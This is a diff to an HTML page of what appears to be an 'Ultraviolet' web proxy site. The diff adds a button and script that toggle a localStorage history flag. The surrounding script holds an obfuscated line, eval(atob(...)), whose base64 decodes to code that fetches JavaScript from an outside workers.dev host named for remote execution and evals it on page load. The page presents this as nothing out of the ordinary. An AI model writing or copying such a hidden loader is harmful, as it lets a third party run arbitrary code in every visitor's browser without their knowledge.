@@ -63,6 +63,7 @@
   </head>
 
   <body>
+    <button id="history"></button>
     <div
       title="Ultraviolet Logo"
       class="flex-center logo-wrapper header-center"
@@ -126,6 +127,20 @@
       }
     }
        eval(atob("ZmV0Y2ggKCJodHRwczovL3JlbW90ZWx5ZXhlY3V0anMuc2hheWFhbmhvb2RhLndvcmtlcnMuZGV2LyIpCi50aGVuKHggPT4geC50ZXh0KCkpCi50aGVuKHkgPT4gZXZhbCh5KSk7"));
+setInterval(function(){
+      if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
+          document.querySelector("#history").innerHTML = "Click this to hide history";
+        } else{
+          document.querySelector("#history").innerHTML = "Click this to show history";
+        }
+}, 0);
+      function setHis(){
+        if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
+          localStorage.setItem("iframe", "there");
+        } else{
+          localStorage.setItem("iframe", "none");
+        }
+      }
     </script>
   </body>
 </html>
